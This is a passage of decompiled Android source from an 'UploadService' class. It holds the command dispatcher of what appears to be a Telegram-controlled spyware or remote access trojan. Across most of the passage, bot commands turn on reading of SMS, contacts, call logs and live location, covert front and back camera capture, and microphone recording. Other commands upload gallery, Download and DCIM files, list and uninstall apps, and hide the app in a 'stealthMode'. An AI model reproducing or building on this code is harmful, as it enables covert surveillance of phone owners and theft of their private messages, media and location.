                                        UploadService.this.setFlashlight(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۱Boolean$arg0$callsetFlashlight$branch8$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass7(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۸String$arg1$callEQEQ$cond9$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.setFlashlight(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۳Boolean$arg0$callsetFlashlight$branch9$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass8(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۰String$arg1$callEQEQ$cond10$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readContacts = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸Boolean$arg0$call$setreadContacts$$branch10$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass9(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass10(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۲String$arg1$callEQEQ$cond11$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readContacts = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۰Boolean$arg0$call$setreadContacts$$branch11$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass11(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۴String$arg1$callEQEQ$cond12$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readSms = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۶Boolean$arg0$call$setreadSms$$branch12$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass12(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass13(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۶String$arg1$callEQEQ$cond13$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readSms = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۸Boolean$arg0$call$setreadSms$$branch13$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass14(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۸String$arg1$callEQEQ$cond14$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readCallLog = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴Boolean$arg0$call$setreadCallLog$$branch14$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass15(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass16(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۰String$arg1$callEQEQ$cond15$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readCallLog = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶Boolean$arg0$call$setreadCallLog$$branch15$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass17(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۲String$arg1$callEQEQ$cond16$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readLocation = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲Boolean$arg0$call$setreadLocation$$branch16$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass18(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.sendCurrentLocationToTelegram();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۴String$arg1$callEQEQ$cond17$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readLocation = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۴Boolean$arg0$call$setreadLocation$$branch17$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass19(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۶String$arg1$callEQEQ$cond18$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stealthMode = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۴Boolean$arg0$call$setstealthMode$$branch18$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass20(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.minimizeAndHideApp();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۸String$arg1$callEQEQ$cond19$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraFront = LiveLiterals$UploadServiceKt.INSTANCE.m۹۸Boolean$arg0$call$setbackgroundCameraFront$$branch19$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job = UploadService.this.cameraFrontJob;
                                        if (job != null) {
                                            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
                                            Unit unit = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraFrontJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass21(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass22(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۲String$arg1$callEQEQ$cond20$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraFront = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰Boolean$arg0$call$setbackgroundCameraFront$$branch20$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job2 = UploadService.this.cameraFrontJob;
                                        if (job2 != null) {
                                            Job.DefaultImpls.cancel$default(job2, (CancellationException) null, 1, (Object) null);
                                            Unit unit2 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraFrontJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass23(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۴String$arg1$callEQEQ$cond21$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraBack = LiveLiterals$UploadServiceKt.INSTANCE.m۹۴Boolean$arg0$call$setbackgroundCameraBack$$branch21$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job3 = UploadService.this.cameraBackJob;
                                        if (job3 != null) {
                                            Job.DefaultImpls.cancel$default(job3, (CancellationException) null, 1, (Object) null);
                                            Unit unit3 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraBackJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass24(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass25(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۶String$arg1$callEQEQ$cond22$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraBack = LiveLiterals$UploadServiceKt.INSTANCE.m۹۶Boolean$arg0$call$setbackgroundCameraBack$$branch22$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job4 = UploadService.this.cameraBackJob;
                                        if (job4 != null) {
                                            Job.DefaultImpls.cancel$default(job4, (CancellationException) null, 1, (Object) null);
                                            Unit unit4 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraBackJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass26(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۸String$arg1$callEQEQ$cond23$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        if (!UploadService.this.liveLocationEnabled) {
                                            UploadService.this.liveLocationEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲Boolean$arg0$call$setliveLocationEnabled$$branch$if$branch23$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        }
                                        Job job5 = UploadService.this.liveLocationJob;
                                        if (job5 != null) {
                                            Job.DefaultImpls.cancel$default(job5, (CancellationException) null, 1, (Object) null);
                                            Unit unit5 = Unit.INSTANCE;
                                        }
                                        UploadService.this.liveLocationJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass27(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass28(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۰String$arg1$callEQEQ$cond24$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.liveLocationEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴Boolean$arg0$call$setliveLocationEnabled$$branch24$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job6 = UploadService.this.liveLocationJob;
                                        if (job6 != null) {
                                            Job.DefaultImpls.cancel$default(job6, (CancellationException) null, 1, (Object) null);
                                            Unit unit6 = Unit.INSTANCE;
                                        }
                                        UploadService.this.liveLocationJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass29(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۲String$arg1$callEQEQ$cond25$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass30(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۴String$arg1$callEQEQ$cond26$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendAllDataEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۰Boolean$arg0$call$setsendAllDataEnabled$$branch26$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass31(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۶String$arg1$callEQEQ$cond27$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendAllDataEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۲Boolean$arg0$call$setsendAllDataEnabled$$branch27$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass32(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۸String$arg1$callEQEQ$cond28$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.microphoneEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶Boolean$arg0$call$setmicrophoneEnabled$$branch28$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass33(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.startMicRecordingLoop();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۰String$arg1$callEQEQ$cond29$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.microphoneEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸Boolean$arg0$call$setmicrophoneEnabled$$branch29$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass34(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.stopMicRecordingLoop();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۴String$arg1$callEQEQ$cond30$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass35(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.sendInstalledAppsToTelegram();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۶String$arg1$callEQEQ$cond31$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass36(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.startGalleryPhotoSending();
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۸String$arg1$callEQEQ$cond32$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stopGalleryPhotoSending();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass37(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۸String$arg0$callstartsWith$cond33$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String pkg = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۵String$arg0$callremovePrefix$valpkg$branch33$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.uninstallAppByPackage(pkg);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۰String$arg1$callEQEQ$cond34$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.vibrateDevice(LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۴Long$arg0$callvibrateDevice$branch34$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass38(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۲String$arg1$callEQEQ$cond35$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stopVibration();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass39(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۴String$arg1$callEQEQ$cond36$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass40(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۳String$arg0$callstartsWith$cond$cond37$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null) && !StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۹String$arg0$callstartsWith$$this$callnot$branch$cond37$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String filename = StringsKt.trim(StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۱String$arg0$callremovePrefix$$$this$calltrim$valfilename$branch37$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass41(UploadService.this, filename, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۰String$arg0$callstartsWith$cond38$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String folder = StringsKt.trim(StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۴String$arg0$callremovePrefix$$$this$calltrim$valfolder$branch38$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass42(UploadService.this, folder, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۶String$arg1$callEQEQ$cond39$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass43(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۰String$arg1$callEQEQ$cond40$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass44(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۱String$arg1$callEQEQ$cond41$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.downloadFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹Boolean$arg0$call$setdownloadFolderSending$$branch41$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass45(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass46(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۲String$arg1$callEQEQ$cond42$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.downloadFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰Boolean$arg0$call$setdownloadFolderSending$$branch42$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass47(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۴String$arg1$callEQEQ$cond43$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass48(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass49(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۶String$arg1$callEQEQ$cond44$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        String replyMarkup = UploadService.this.buildDownloadFolderKeyboard();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass50(UploadService.this, replyMarkup, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۸String$arg1$callEQEQ$cond45$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimCameraFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۱Boolean$arg0$call$setdcimCameraFolderSending$$branch45$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass51(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass52(UploadService.this, null), 3, (Object) null);
